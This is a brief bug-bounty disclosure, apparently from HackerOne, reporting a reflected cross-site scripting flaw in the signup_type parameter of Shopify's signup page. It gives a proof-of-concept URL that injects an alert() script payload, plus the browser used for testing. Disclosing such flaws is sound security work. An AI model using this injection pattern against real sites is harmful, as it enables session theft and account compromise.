# HackerOne Report: XSS https://www.shopify.com/signup
**Report ID:** 85291
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
https://www.shopify.com/signup?signup_type=%27|alert%28%27XSS%27%29|%27
Vulnerable param is signup_type. For the XSS i used '|alert('XSS')|'

Tested in Mozilla Firefox 40.0.3

## Discussion & Remediation Timeline
